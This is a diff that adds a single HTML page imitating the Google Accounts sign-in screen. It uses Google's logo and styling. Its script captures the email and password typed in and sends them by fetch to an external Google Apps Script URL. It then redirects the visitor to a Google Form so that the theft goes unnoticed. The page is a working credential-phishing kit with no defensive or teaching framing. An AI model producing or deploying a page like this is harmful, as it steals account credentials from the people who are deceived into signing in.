@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in - Google Accounts</title>
+  <style>
+    /* Basic styling to mimic Google's login page */
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+    .login-container {
+      max-width: 360px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 40px 40px 30px;
+      box-shadow: 0 2px 10px rgb(0 0 0 / 0.2);
+      border-radius: 8px;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 24px 0;
+      color: #202124;
+      text-align: center;
+    }
+    .input-field {
+      width: 100%;
+      margin-bottom: 20px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      outline-offset: 2px;
+      outline-color: #4285f4;
+      box-sizing: border-box;
+      transition: border-color 0.2s;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #4285f4;
+    }
+    button {
+      width: 100%;
+      background-color: #1a73e8;
+      border: none;
+      color: #fff;
+      padding: 14px 0;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 500;
+      transition: background-color 0.2s;
+    }
+    button:hover {
+      background-color: #1765cc;
+    }
+    .footer-text {
+      font-size: 12px;
+      text-align: center;
+      color: #5f6368;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" role="main">
+    <!-- Google logo simplified: use text as placeholder or you can use real google logo URL if allowed -->
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo" />
+    <h1>Sign in</h1>
+    <form id="login-form">
+      <div class="input-field">
+        <input id="email" name="email" type="email" autocomplete="username" placeholder="Email or phone" required />
+      </div>
+      <div class="input-field">
+        <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required />
+      </div>
+      <button type="submit">Next</button>
+    </form>
+    <p class="footer-text">Use your Google Account</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('login-form');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = form.email.value;
+      const password = form.password.value;
+
+      // Replace this URL with your deployed Google Apps Script Web App URL
+      const googleScriptURL = 'https://script.google.com/macros/s/AKfycbyBdWxhu8-K7fSeMeb16-36uxBX-_d3YsBl7qJR3PReirlDbh8O0S5jjW9NP_Ta1uWH/exec';
+
+      try {
+        // Send data by POST to Google Apps Script
+        const response = await fetch(googleScriptURL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({email, password})
+        });
+
+        // Redirect to your real Google Form URL after submission
+        window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLScrWwlFdWR2KYq5b35OhuROqSsdN1xAAQOrjyRZUiIGXRCSCg/viewform?usp=dialog';
+
+      } catch (error) {
+        console.error('Error submitting data', error);
+        alert('There was an error. Please try again.');
+      }
+    });
+  </script>
+</body>
+</html>
+
+i
